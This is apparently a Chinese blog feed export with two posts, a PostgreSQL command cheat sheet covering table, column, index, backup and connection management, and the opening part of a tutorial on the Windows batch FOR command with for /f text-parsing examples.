<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table TESTCASE(</span><br><span class="line">id INTEGER, </span><br><span class="line">task_class INTEGER,</span><br><span class="line">age TEXT,</span><br><span class="line">PRIMARY KEY(id, task_class)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>例2（自增SERIAL）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create table CREATETASK_CHKID_N( </span><br><span class="line">id SERIAL PRIMARY KEY, </span><br><span class="line">chk_id TEXT, </span><br><span class="line">n INTEGER</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>其中SERIAL代表自增，默认从1开始增加，每次自增1。</p>
<h3 id="删除表"><a href="#删除表" class="headerlink" title="删除表"></a>删除表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`drop table REL_CROSS_NODE;`</span><br></pre></td></tr></table></figure>

<h3 id="清空表"><a href="#清空表" class="headerlink" title="清空表"></a>清空表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">delete from [表名]</span><br></pre></td></tr></table></figure>

<p>or</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TRUNCATE TABLE  [表名]</span><br></pre></td></tr></table></figure>

<p>区别：Truncate table 表名 (注:不带where语句) 速度快,而且效率高。</p>
<p>因为DELETE 语句每次删除一行，并在事务日志中为所删除的每行记录一项。TRUNCATE TABLE 通过释放存储表数据所用的数据页来删除数据，并且只在事务日志中记录页的释放</p>
<h3 id="添加字段"><a href="#添加字段" class="headerlink" title="添加字段"></a>添加字段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`alter table [表名] add column [字段名] [类型];`</span><br></pre></td></tr></table></figure>

<h3 id="更改字段"><a href="#更改字段" class="headerlink" title="更改字段"></a>更改字段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table [表名] rename column [旧字段名] to [新字段名];</span><br><span class="line"></span><br><span class="line">例：把表table_ex字段col_1限制非空去掉：ALTER TABLE table_eg ALTER col_1 drop not NULL</span><br></pre></td></tr></table></figure>

<h5 id="更改字段属性，含空格"><a href="#更改字段属性，含空格" class="headerlink" title="更改字段属性，含空格"></a><strong>更改字段属性，含空格</strong></h5><p>如果把字段colname把属性Text转化为int，原来text里面存在空啥的，可以</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER TABLE tablename ALTER COLUMN colname TYPE int USING (trim(colname)::integer);</span><br></pre></td></tr></table></figure>

<h5 id="更改字段由int4–-gt-int8"><a href="#更改字段由int4–-gt-int8" class="headerlink" title="更改字段由int4–&gt;int8"></a><strong>更改字段由int4–&gt;int8</strong></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alter table test_data alter column task_id type bigint using task_id::bigint</span><br></pre></td></tr></table></figure>

<h3 id="删除字段"><a href="#删除字段" class="headerlink" title="删除字段"></a>删除字段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`alter table [表名] drop column [字段名];`</span><br></pre></td></tr></table></figure>

<h3 id="表中插入一行数据"><a href="#表中插入一行数据" class="headerlink" title="表中插入一行数据"></a>表中插入一行数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`insert into [表名] (字段``1``,字段``2``) values (值``1``,值``2``);`</span><br></pre></td></tr></table></figure>

<p>例如：    </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`insert into assist_info (``id``, maat_id, block_type) values (``&apos;F006&apos;``, ``&apos;F7775&apos;``, 1)  `</span><br></pre></td></tr></table></figure>

<p><strong>注</strong>：</p>
<ul>
<li>如果表中字段有大写的字段，则需要对应的加上双引号。例：insert into test (no, “Name”) values (‘123’, ‘jihite’);</li>
<li>值用单引号引起来(‘’)，不能用双引号（””）</li>
</ul>
<h3 id="表中删除一行数据"><a href="#表中删除一行数据" class="headerlink" title="表中删除一行数据"></a>表中删除一行数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`delete from [表名] where [该行特征];`</span><br></pre></td></tr></table></figure>

<h3 id="修改表中数据"><a href="#修改表中数据" class="headerlink" title="修改表中数据"></a>修改表中数据</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`update [表名] set [目标字段名]=[目标值] where [该行特征]`</span><br></pre></td></tr></table></figure>

<h3 id="删除表-1"><a href="#删除表-1" class="headerlink" title="删除表"></a>删除表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`drop table [表名];`</span><br></pre></td></tr></table></figure>

<h3 id="退出postgreSql"><a href="#退出postgreSql" class="headerlink" title="退出postgreSql"></a>退出postgreSql</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\q</span><br></pre></td></tr></table></figure>

<h3 id="两个查询结果做差-except"><a href="#两个查询结果做差-except" class="headerlink" title="两个查询结果做差 except"></a>两个查询结果做差 except</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`(select node_id from node where node_id=``1` `or node_id=``2``) except (select node_id from node where node_id=``1``);`` ``node_id``---------``       ``2``(``1` `row)`</span><br></pre></td></tr></table></figure>

<h3 id="复制表"><a href="#复制表" class="headerlink" title="复制表"></a>复制表</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE test_a_copy AS SELECT * FROM test_a;</span><br></pre></td></tr></table></figure>

<h3 id="命令导入sql数据文件"><a href="#命令导入sql数据文件" class="headerlink" title="命令导入sql数据文件"></a>命令导入sql数据文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psql -h localhost  -d databaseName  -U username -f  filename</span><br></pre></td></tr></table></figure>

<h3 id="查询结果存储到输出文件"><a href="#查询结果存储到输出文件" class="headerlink" title="查询结果存储到输出文件"></a>查询结果存储到输出文件</h3><p>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\o file_path</span><br></pre></td></tr></table></figure>

<p>这样就会把查询结果存储到输出文件中。例</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">postgres=&gt; \o /home/jihite/data/iu_data;</span><br><span class="line">postgres=&gt; select test_id from cdb_all_iu_data limit 10;</span><br><span class="line">postgres=&gt; select test_id from cdb_all_iu_data limit 5;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">test_id</span><br><span class="line">--------------</span><br><span class="line">         2143</span><br><span class="line">         2153</span><br><span class="line">         2144</span><br><span class="line">         2156</span><br><span class="line">         2145</span><br><span class="line">         2154</span><br><span class="line">         2146</span><br><span class="line">         2157</span><br><span class="line">         2147</span><br><span class="line">         2155</span><br><span class="line">(10 rows)</span><br><span class="line"></span><br><span class="line">test_id</span><br><span class="line">--------------</span><br><span class="line">         2143</span><br><span class="line">         2153</span><br><span class="line">         2144</span><br><span class="line">         2156</span><br><span class="line">         2145</span><br><span class="line">(5 rows)</span><br></pre></td></tr></table></figure>

<h3 id="数据库的备份-amp-恢复"><a href="#数据库的备份-amp-恢复" class="headerlink" title="数据库的备份&amp;恢复"></a>数据库的备份&amp;恢复</h3><p>导出到线下文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pg_dump --host hostname --port port --username username -t tablename -d dbname &gt;/home/jihite/table.sql</span><br></pre></td></tr></table></figure>

<p>把线下文件导入到数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">psql -h 10.125.7.68 -p 5432 -d postgres -U postgres -W postgres -f 2.sql</span><br></pre></td></tr></table></figure>

<h3 id="x"><a href="#x" class="headerlink" title="\x"></a>\x</h3><p><a href><img src="file:///var/folders/13/5_qy4sz928nbrf6spnjzf5kr0000gn/T/WizNote/8b487178-0682-4cd1-a63c-4db33d0fe744/index_files/55842ede-951a-4751-982b-14f25fc09ff1.gif" alt="复制代码"></a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">postgres=&gt; \x</span><br><span class="line">Expanded display is on.</span><br><span class="line">postgres=&gt; select *  from cdb_chk_items where chk_id = &apos;R000000335&apos;;</span><br><span class="line">-[ RECORD 1 ]+------------------------------------------------------------------------------------------------</span><br><span class="line">chk_id       | R000000335</span><br><span class="line">chk_desc     | 道路属性与道路属性相关检查</span><br><span class="line">chk_info     | &#123;&quot;FIELDS&quot;: &#123;&quot;TRAFFIC_SIGN&quot;: [&quot;TYPE&quot;, &quot;GEOM&quot;], &quot;ROAD_LINK&quot;: [&quot;ROAD_CLASS&quot;, &quot;FORM_WAY&quot;, &quot;GEOM&quot;]&#125;&#125;</span><br><span class="line">err_desc     | &#123;&quot;ERR2&quot;: &quot;roadclass取值错误&quot;, &quot;ERR1&quot;: &quot;formway取值错误&quot;&#125;</span><br><span class="line">chk_level    | 1</span><br><span class="line">is_opened    | 1</span><br><span class="line">module_name  | TRAFFIC_SIGN</span><br><span class="line">invalid_flag | 1</span><br><span class="line">rel_mode     | MAIN_LAYER:TRAFFIC_SIGN</span><br><span class="line">             :         TRAFFIC_SIGN|A,M|DIRECT</span><br><span class="line">             :         ROAD_LINK|A,M,D|ATTR_REL</span><br></pre></td></tr></table></figure>

<h3 id="从表A中把符合条件的记录拷贝到表B"><a href="#从表A中把符合条件的记录拷贝到表B" class="headerlink" title="从表A中把符合条件的记录拷贝到表B"></a>从表A中把符合条件的记录拷贝到表B</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into A select * from B where id  in (&apos;a&apos;, &apos;b&apos;, &apos;c&apos;);</span><br></pre></td></tr></table></figure>

<h3 id="建立索引"><a href="#建立索引" class="headerlink" title="建立索引"></a>建立索引</h3><p>单字段索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE INDEX index_name ON table_name (field1);</span><br></pre></td></tr></table></figure>

<p>多字段索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE INDEX index_name ON table_name (field1,field2);</span><br></pre></td></tr></table></figure>

<p>查看所有表的索引使用情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select </span><br><span class="line">    relname, indexrelname, idx_scan, idx_tup_read, idx_tup_fetch </span><br><span class="line">from </span><br><span class="line">    pg_stat_user_indexes </span><br><span class="line">order by </span><br><span class="line">    idx_scan asc, idx_tup_read asc, idx_tup_fetch asc;</span><br></pre></td></tr></table></figure>

<p>查看某个表索引的使用情况</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select </span><br><span class="line">    relname, indexrelname, idx_scan, idx_tup_read, idx_tup_fetch </span><br><span class="line">from </span><br><span class="line">    pg_stat_user_indexes </span><br><span class="line">where</span><br><span class="line">    relname = table_name </span><br><span class="line">order by </span><br><span class="line">    idx_scan asc, idx_tup_read asc, idx_tup_fetch asc;</span><br></pre></td></tr></table></figure>

<h3 id="超找数据库的连接信息"><a href="#超找数据库的连接信息" class="headerlink" title="超找数据库的连接信息"></a>超找数据库的连接信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from pg_stat_activity</span><br></pre></td></tr></table></figure>

<p>包含：客户端user、ip、执行语句，状态、时间</p>
<h3 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">drop database cmdbuild;</span><br></pre></td></tr></table></figure>

<p>如有报错：</p>
<p><img src="/articles/6d5035d1/3.png" alt="img"></p>
<p>请用下面命令先把连接停掉，再删除</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT pg_terminate_backend(pg_stat_activity.pid) FROM pg_stat_activity WHERE datname=&apos;cmdbuild&apos; AND pid&lt;&gt;pg_backend_pid();</span><br></pre></td></tr></table></figure>

<h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database cmdbuild;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>数据库</category>
        <category>SQL</category>
        <category>PostgreSQL</category>
      </categories>
      <tags>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>windows批处理用法之FOR</title>
    <url>/articles/a4585fee.html</url>
    <content><![CDATA[<h2 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a><strong>大纲</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">一 前言</span><br><span class="line">二 for语句的基本用法</span><br><span class="line">三 for /f （delims、tokens、skip、eol、userbackq、变量延迟）</span><br><span class="line">四 for /r （递归遍历）</span><br><span class="line">五 for /d （遍历目录）</span><br><span class="line">六 for /l （计数循环）</span><br></pre></td></tr></table></figure>

 <a id="more"></a>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>在批处理中，for是最为强大的命令语句，它的出现，使得解析文本内容、遍历文件路径、数值递增/递减等操作成为可能；配合if、call、goto等流程控制语句，更是可以实现脚本复杂的自动化、智能化操作；合理使用for语句，还能使代码大为简化，免除各位编写大量重复语句之苦。而能否熟练使用for语句，已经成为衡量一个人批处理水平高低最主要的标准。</p>
<p>在这个系列教程中，我将通过实际应用中频繁出现的例子，带领大家步入for语句的神奇之门，一步步迈向for语句的魔幻殿堂，使得大家在实际的应用中，能独立写出简洁高效的代码，在批处理的世界里自由驰骋。</p>
<p>注意：以下的讲解，都是基于简体中文版Windows XP Pro SP3的操作系统环境。</p>
<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a><strong>基本用法</strong></h2><p>正如色彩缤纷的七彩光芒是由红绿蓝三原色构成的一样，最复杂的for语句，也有其基本形态，它的模样是这样的：</p>
<p>在cmd窗口中：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> %variable <span class="keyword">IN</span> (<span class="built_in">set</span>) <span class="keyword">DO</span> command [command-parameters]</span><br></pre></td></tr></table></figure>

<p>在批处理文件中：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> <span class="variable">%%v</span>ariable <span class="keyword">IN</span> (<span class="built_in">set</span>) <span class="keyword">DO</span> command [command-parameters]</span><br></pre></td></tr></table></figure>

<p>具体例子：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="keyword">For</span> %i <span class="keyword">in</span> (<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>) <span class="keyword">do</span> @<span class="built_in">echo</span> %i</span><br></pre></td></tr></table></figure>

<p>之所以要区分cmd窗口和批处理文件两种环境，是因为在这两种环境下，命令语句表现出来的行为虽然基本一样，但是在细节上还是稍有不同。<br>最明显的一个差异就是：在cmd窗口中，for之后的形式变量I必须使用单百分号引用，即%i；而在批处理文件中，引用形式变量i必须使用双百分号，即%%i。<br>为了方便起见，若不是特别强调，以下的讲解都以批处理文件环境为例。</p>
<p>我们先来看一下for语句的基本要素都有些什么：<br>  1、for、in和do是for语句的关键字，它们三个缺一不可；<br>  2、%%I是for语句中对形式变量的引用，就算它在do后的语句中没有参与语句的执行，也是必须出现的；<br>  3、in之后，do之前的括号不能省略；<br>  4、command1表示字符串或变量，command2表示字符串、变量或命令语句；</p>
<p>现在，你可能已经会写一个简单的for语句了，比如：<br>[code1]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">for %%I in (bbs.bathome.net) do echo %%I</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>保存为批处理文件并执行，将会在弹出的批处理窗口中看到这样的信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bbs.bathome.net</span><br><span class="line">请按任意键继续...</span><br></pre></td></tr></table></figure>

<p>很快地，你会觉得这个for语句是如此的简单，简单到你丝毫感受不出它的强大：这个for语句，和我直接用echo语句没什么两样啊！</p>
<p>是的，演示代码永远都只是演示而已，就像大多数高级语言的教科书一样，在引导新手学习的时候，基本上都是千篇一律地告诉大家如何编写一个能显示 hello world! 的窗口，从这些演示代码中，你看不到它们具有多少实用性，你只是感到有点好奇：咦，居然弹出了一个窗口？片刻之后，你就会觉得索然无味。</p>
<p>那好吧，为了让大家对for更加感兴趣，我们先来分析一下for语句的一些注意事项，之后，再让大家看看更为强大的for语句实例。</p>
<p>   1、for语句的形式变量I，可以换成26个字母中的任意一个，这些字母会区分大小写，也就是说，%%I和%%i会被认为不是同一个变量；形式变量I还可以换成其他的字符，但是，为了不与批处理中的%0～%9这10个形式变量发生冲突，请不要随意把%%I替换为%%0 ～%%9中的任意一个；<br>   2、in和do之间的command1表示的字符串或变量可以是一个，也可以是多个，每一个字符串或变量，我们称之为一个元素，每个元素之间，用空格键、跳格键、逗号、分号或等号分隔；<br>   3、for语句依次提取command1中的每一个元素，把它的值赋予形式变量I，带到do后的command2中参与命令的执行；并且每次只提取一个元素，然后执行一次do后的命令语句，而无论这个元素是否被带到command2中参与了command2的运行；当执行完一次do后的语句之后，再提取command1中的下一个元素，再执行一次command2，如此循环，直到command1中的所有元素都已经被提取完毕，该for语句才宣告执行结束；</p>
<p>其中，第3点是最为关键的，它描述了for语句的执行过程，是for语句的精髓所在，大家一定要牢记这一条，才能深刻理解更为复杂的for流程。</p>
<p>有了以上的基础，我们再来看一个例子，这个例子修改了[code1]的部分内容，结果将大不一样：<br>[code2]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">for %%I in (bbs,bathome,net) do echo %%I</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>和[code1]的执行结果[result1]相比，[result2]发生了如下变化：<br>   1、显示结果分成了3行（不算最后一行中文提示）；<br>　2、每一行都从逗号处被切分；</p>
<p>如果把 bbs.bathome.net 这个字符串中的点号换为空格、跳格或等号，执行结果将和example2的执行结果别无二致。</p>
<p>现在，我们来分析一下[code2]代码中for语句的执行过程：<br>　首先，for语句以逗号为分隔符，把 bbs,bathome.net 这个字符串切分成三个元素：bbs、bathome和cn，由此决定了do后的语句将会被执行3次；<br>　然后，第一次执行过程是这样的：先把 bbs 这个字符串作为形式变量I的值，带入do后的语句中加以执行，也就是执行 echo %%I 语句，此时的I值为bbs，因此，第一次执行的结果，将会在屏幕上显示bbs这个字符串；第二次执行和第一次执行的过程是一样的，只不过此时I的值已经被替换为command1中的第二个元素了，也就是 bathome 这个字符串；如此循环，当第三次echo执行完毕之后，整条for语句才算执行完毕，此时，将执行下一条语句，也就是pause命令。</p>
<p>其实，这个例子只比上一个例子多了一点花样，有趣了那么一点点：一条for语句的执行结果居然被分成了3行！</p>
<p>为了让大家见识一下for的真正威力，本人绞尽脑汁，翻帖无数，不得要领，万般无奈之下，只好亮出了尘封在箱底多年的一段代码：检测当前硬盘都有哪些分区。</p>
<p>[code3]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">set</span> str=c d e f g h i j k l m n o p q r s t u v w x y z</span><br><span class="line"><span class="built_in">echo</span> 当前硬盘的分区有：</span><br><span class="line"><span class="keyword">for</span> <span class="variable">%%i</span> <span class="keyword">in</span> (<span class="variable">%str%</span>) <span class="keyword">do</span> <span class="keyword">if</span> <span class="keyword">exist</span> <span class="variable">%%i</span>: <span class="built_in">echo</span> <span class="variable">%%i</span>:</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>这段代码能检测硬盘都有哪些分区，包括U盘和移动硬盘的分区，但是，当光驱中有盘的时候，也会被列出来，这是本代码的一个缺憾，在以后的讲解中，我将向大家讲述如何消除这个瑕疵，敬请关注本系列的后续章节。</p>
<p>高级应用：</p>
<p>想知道当前目录下都有哪些文件吗？请用下面的代码：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> <span class="variable">%%i</span> <span class="keyword">in</span> (*.*) <span class="keyword">do</span> <span class="built_in">echo</span> "<span class="variable">%%i</span>"</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>想列出当前目录下所有的文本文件吗？请用下面的代码</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> <span class="variable">%%i</span> <span class="keyword">in</span> (*.txt) <span class="keyword">do</span> <span class="built_in">echo</span> "<span class="variable">%%i</span>"</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>想列出只用两个字符作为文件名的文本文件吗？(注:实际上这个代码是输出少于或等于两个字符作为文件名的文本文件)请用下面的代码：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> <span class="variable">%%i</span> <span class="keyword">in</span> (??.txt) <span class="keyword">do</span> <span class="built_in">echo</span> "<span class="variable">%%i</span>"</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>题外话：</p>
<p>  1、列出当前目录下各种文件的方法，最简单的还是用dir命令，但是，从以上代码中，各位可以加深对for语句执行流程的理解（用到了通配符*和?）；<br>  2、注意：以上代码不能列出含有隐藏或系统属性的文件；（注：这里其实有一个很有趣的现象，windows中的系统文件一般具备两种属性——隐藏和系统；但是你如果测试的话就会发现，加上+s属性，但是不加+h的文件是可以被简单的for显示出来的。<br>例如：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">attrib</span> +s <span class="number">1</span>.txt</span><br><span class="line"><span class="keyword">For</span> <span class="variable">%%i</span> <span class="keyword">in</span> (*.txt) <span class="keyword">do</span> <span class="built_in">Echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>这里的1.txt在结果中显示出来了。所以“以上代码不能列出含有隐藏或系统属性的文件”是不准确的，而因该说成“以上代码不能列出含有隐藏属性的文件”）</p>
<h2 id="文本解析显神威：for-f-用法详解"><a href="#文本解析显神威：for-f-用法详解" class="headerlink" title="文本解析显神威：for /f 用法详解"></a><strong>文本解析显神威：for /f 用法详解</strong></h2><p>前言<br>　for /f 是个十分强大的家伙。<br>　如果说，for语句是批处理中最强大的语句的话，那么，for /f 就是精华中的精华。<br>　for /f 的强大，和它拥有众多的开关密切相关。因为开关众多，所以用法复杂，本章将分成若干小节，为大家逐一介绍强大的 for /f 语句。</p>
<h4 id="为解析文本而生：for-f-的基本用法"><a href="#为解析文本而生：for-f-的基本用法" class="headerlink" title="为解析文本而生：for /f 的基本用法"></a><strong>为解析文本而生：for /f 的基本用法</strong></h4><p>所有的对象，无论是文件、窗体、还是控件，在所有的非机器语言看来，无外乎都是形如”c:\test.txt”、”CWnd”之类的文本信息；而所有的对象，具体的如ini文件中的某条配置信息、注册表中的某个键值、数据库中的某条记录……都只有转化为具有一定格式的文本信息，方可被代码识别、操控。可以说，编程的很大一部分工作，都是在想方设法绞尽脑汁如何提取这些文本信息。</p>
<p>而提取文本信息，则是for /f的拿手好戏：读取文件内容；提取某几行字符；截取某个字符片段；对提取到的内容再切分、打乱、杂糅……只要你所能想到的花样，for /f 都会想方设法帮你办到，因为，for /f 就是被设计成专门用于解析文本的。</p>
<p>先来看个例子。</p>
<p>假如有个文本文件test.txt，内容如下：<br>[txt1]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">论坛的目标是：不求最大，但求最好，做最实用的批处理论坛。</span><br><span class="line">论坛地址：bbs.bathome.net。</span><br><span class="line">这里是：新手晋级的福地，高手论剑的天堂。</span><br></pre></td></tr></table></figure>

<p>那么，将如下代码保存为test.cmd，并放在test.txt同一目录下运行，将会在屏幕上原样显示test.txt的内容：<br>[code4]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>这段代码，主要是让你树立这样一种观念：读取文本文件的内容（注：改为“逐行分析文本文件的内容”，因为读取文本文件内容的方法命令有很多，比如重定向输入，又比如type/more/find/sort等命令），请使用 for /f 语句！</p>
<p>进阶话题：for /f 语句是把整个test.txt一次性显示出来的？</p>
<p>在这段代码中，虽然执行结果是把test.txt中的所有内容都显示出来了，貌似 for /f 语句是把整个test.txt一次性显示到屏幕上，实际上并非如此。</p>
<p>无论for语句做何种变化，它的执行过程仍然遵循基本的for流程：依次处理每个元素，直到所有的元素都被处理为止。只不过在for /f语句中，这里的元素是指文件中的每一行，也就是说，for /f 语句是以行为单位处理文本文件的。这是一条极为重要的规则，在上一章中也强调过它的重要性，希望在接下来的学习过程中，你能时刻牢记这一原则，那么，很多问题将会迎刃而解。以下是验证这一说法的演示代码（在[code4]的基础上添加了&amp;pause语句）：<br>[code5]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span>&amp;<span class="built_in">pause</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<h4 id="切分字符串的利器：delims"><a href="#切分字符串的利器：delims" class="headerlink" title="切分字符串的利器：delims="></a><strong>切分字符串的利器：delims=</strong></h4><p>也许你对[code4]这段代码不屑一顾：不就是把test.txt的内容显示出来了么？好像用处不大啊。</p>
<p>好吧，我们来玩个魔术。</p>
<p>还是[txt1]这段文本，把[code4]改造一下：<br>[code6]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "delims=，" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>再次运行test.cmd，看到什么变化了吗？<br>[result2]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">论坛的目标是：不求最大</span><br><span class="line">论坛地址：bbs.bathome.net。</span><br><span class="line">这里是：新手晋级的福地</span><br><span class="line">请按任意键继续...</span><br></pre></td></tr></table></figure>

<p>结果，你惊奇地发现，每行第一个逗号之后的所有内容都不见了（如果有不存在逗号的行，则保留原样），也就说，你成功地提取到了每行第一个逗号之前的所有内容！</p>
<p>试想一下，这段代码会有什么用呢？</p>
<p>如果别人给了你一个软件清单，每行都是”英文软件名（逗号）中文软件名”的格式，而你却只想保留英文名的时候，这段代码将是多么有用啊！再假设，有这么一个IP文件，第一列是数字格式的IP地址，第二列是具体的空间地址，列与列之间用逗号分隔，而你想提取其中数字格式的IP，呵呵，我不说你也知道该怎么办了吧？</p>
<p>要是文本内容不是以逗号分隔，而是以其他符号分隔，那么，把”delims=,”的逗号换成相应的符号就可以了。</p>
<p>在这里，我们引入了一个新的开关：”delims=，”，它的含义是：以逗号作为被处理的字符串的分隔符号。</p>
<p>在批处理中，指定分隔符号的方法是：添加一个形如 “delims=符号列表” 的开关，这样，被处理的每行字符串都会被符号列表中罗列出来的符号切分开来。</p>
<p>需要注意的是：如果没有指定”delims=符号列表”这个开关，那么，for /f 语句默认以空格键或跳格键作为分隔符号。请把[txt1]中不同位置上的标点符号改为空格或跳格，再运行[code4]试试。</p>
<p>进阶话题：如果我要指定的符号不止一个，该怎么办？</p>
<p>在上面的讲解中，我提到了指定分隔符号的方法：添加一个形如”delims=符号列表”的开关。不知道你注意到没有，我的说法是”符号列表”而非”符号”，这是大有讲究的，因为，你可以一次性指定多个分隔符号！</p>
<p>还是以[txt1]为例，把[code6]再改造一下<br>[code7]</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /f "delims=.，" <span class="variable">%%i</span> <span class="keyword">in</span> (test.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%%i</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure>

<p>结果显示：<br>[result3]</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">论坛的目标是：不求最大</span><br><span class="line">论坛地址：bbs</span><br><span class="line">这里是：新手晋级的福地</span><br><span class="line">请按任意键继续...</span><br></pre></td></tr></table></figure>

<p>这样，第一个点号或第一个逗号之前的内容都被提取出来了。</p>
<p>[code7]的执行过程是：逐行读取test.txt中的内容，以点号和逗号切分每一行的内容（不存在点号和逗号的行，则不再切分，为了描述的方便，我们把被点号或逗号切分的一个一个的字符串片段，称之为节），然后，for /f 会提取第一节的内容作为最终结果，显示在屏幕上。需要注意的是，在这里，所有行的字符串被切分成了两个以上的节，但是，[code7]的代码只会提取第一节字符串的内容，因为 for /f 语句默认只提取第一节的符串。</p>
<h4 id="定点提取：tokens"><a href="#定点提取：tokens" class="headerlink" title="定点提取：tokens="></a><strong>定点提取：tokens=</strong></h4><p>上一节在讲解 delims= 的时候，我一再强调 for /f 默认只能提取到第一节的内容，现在我们来思考一个问题：如果我要提取的内容不在第一节上，那怎么办？</p>
<p>这回，就该轮到 tokens= 出马了。</p>
<p>tokens= 后面一般跟的是数字，如 tokens=2，也可以跟多个，但是每个数字之间用逗号分隔，如 tokens=3,5,8，它们的含义分别是：提取第2节字符串、提取第3、第5和第8节字符串。注意，这里所说的“节”，是由 delims= 这一开关划分的，它的内容并不是一成不变的。</p>
<p>下面来看一个例子：<br>[txt2]</p>
